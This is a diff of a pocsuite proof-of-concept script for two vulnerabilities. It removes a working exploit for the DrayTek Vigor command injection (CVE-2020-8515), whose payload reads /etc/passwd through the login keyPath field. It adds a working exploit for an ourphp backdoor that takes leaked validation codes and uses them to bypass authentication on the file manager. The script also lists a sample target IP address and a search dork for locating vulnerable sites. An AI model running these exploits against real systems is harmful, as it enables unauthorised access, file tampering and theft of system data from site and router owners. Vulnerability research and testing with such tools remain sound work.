@@ -1,81 +1,76 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
 import urlparse
 
-from pocsuite.api.poc import POCBase
-from pocsuite.api.poc import register
-from pocsuite.api.poc import Output
+from pocsuite.api.poc import POCBase, register, Output
 from pocsuite.api.request import req
-from pocsuite.api.utils import randomStr
 
 
 class TestPOC(POCBase):
-
-    vulID = 'CVE-2020-8515'
-    version = ''
+    vulID = ''
+    version = '1'
     author = 'elloit'
-    vulDate = '2020-03-30'
-    createDate = '2020-03-30'
-    updateDate = '2020-03-30'
-    references = [
-        "https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-router-web-management-page-vulnerability-(cve-2020-8515)/",
-        "https://blog.netlab.360.com/two-zero-days-are-targeting-draytek-broadband-cpe-devices/"
-    ]
-    name = 'CVE-2020-8515 draytek 企业级路由器命令执行漏洞'
-    appPowerLink = '"https://www.draytek.com/'
-    appName = 'DrayTek Vigor'
-    appVersion = '''
-        '''
-    vulType = '命令执行'
+    vulDate = ''
+    createDate = ''
+    updateDate = ''
+    references = ['https://xz.aliyun.com/t/4315']
+    name = 'ourphp 后门漏洞'
+    appPowerLink = 'http://www.ourphp.net'
+    appName = 'ourphp'
+    appVersion = 'v1.7.5-v1.8.3'
+    vulType = '后门'
     desc = '''
-        '''
+    在function\editor\php\upload_json.php 中会暴露出生成的校验码，导致口令码和校验码泄露。
+    在http://localhost:88/client/manage/ourphp_filebox.php?op=home&folder=./&validation=12345&code=QZRdvlYHlDUgqZubIGV9Mx46JCqmDNkmYHlDUg
+    处，将泄露的口令码和 校验码 + 校验码第七位到第十二位之间的部分， 即可通过验证，对网站文件进行管理。
+    '''
     samples = [
-       
+        "https://123.207.235.207"
     ]
     install_requires = ""
-
-    def _attack(self):
-        return self._verify()
+    search_keyword = '"Powered by ourphp"'
 
     def _verify(self):
         result = {}
-        self.raw_url = self.url
-        host = urlparse.urlparse(self.url).hostname
-        port = urlparse.urlparse(self.url).port
-        scheme = urlparse.urlparse(self.url).scheme
-        if port is None:
-            port = "80"
-        else:
-            port = str(port)
-        if "https" == scheme:
-            self.url = "%s://%s" % (scheme, host)
-        else:
-            self.url = "%s://%s:%s" % (scheme, host, port)
-
+        # 格式化URL
+        url = urlparse.urlparse(self.url)
+        vul_url = url.scheme + "://" + url.netloc + "/function/editor/php/upload_json.php?upload_file=hola"
         try:
-            flag = randomStr(10)
-            check = self.run_cmd("echo${IFS}" + flag).split("\n")[0]
-            if flag == check:
-                result["VerifyInfo"] = {}
-                result["VerifyInfo"]["url"] = self.url
-                result["VerifyInfo"]["passwd"] = self.run_cmd("cat${IFS}%2fetc%2fpasswd")
-                result["VerifyInfo"]["hosts"] = self.run_cmd("cat${IFS}%2fetc%2fhosts")
+            res = req.get(url=vul_url, timeout=(10, 15), verify=False)
+            if res.status_code == 200:
+                text = res.text.replace("<!--", "")
+                text = text.replace("-->", "")
+                validation = text.split("||")[0]
+                safecode = text.split("||")[1]
+                vul_url_check = url.scheme + "://" + url.netloc + \
+                                "/client/manage/ourphp_filebox.php?op=home&folder=./&validation="+ validation +\
+                                "&code=" + safecode + safecode[6:12]
+                res_check = req.get(url=vul_url_check, timeout=(10, 15), verify=False)
+                if res_check.status_code == 200 and "重命名" in res_check.content:
+                    result["VerifyInfo"] = {}
+                    result["VerifyInfo"]["URL"] = self.url
+                    result["extra"] = {}
+                    result["extra"]["validation"] = validation
+                    result["extra"]["safecode"] = safecode
+                    result["extra"]["info"] = self.get_info()
         except Exception as e:
-            pass
+            return self.parse_output(result)
+
         return self.parse_output(result)
 
-    def run_cmd(self, cmd):
+    def _attack(self):
+        self._verify()
+
+    def get_info(self):
         try:
-            headers = {
-                "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"
-            }
-            url = self.url + "/cgi-bin/mainfunction.cgi"
-            data = "action=login&keyPath=%27%0A%2fbin%2f" + cmd + "%0A%27&loginUser=a&loginPwd=a"
-            res = req.post(url=url, data=data, timeout=(10, 15), headers=headers)
-            if res.status_code == 200:
-                return res.text
-            else:
-                return ""
-        except Exception as e:
+            page = req.get(self.url, timeout=(10, 15), verify=False).text
+            title_left_index = page.find("<title>")
+            title_right_index = page.find("</title>")
+            title = page[title_left_index+7:title_right_index].strip()
+        except:
             return ""
+        return title
 
     def parse_output(self, result):
         output = Output(self)
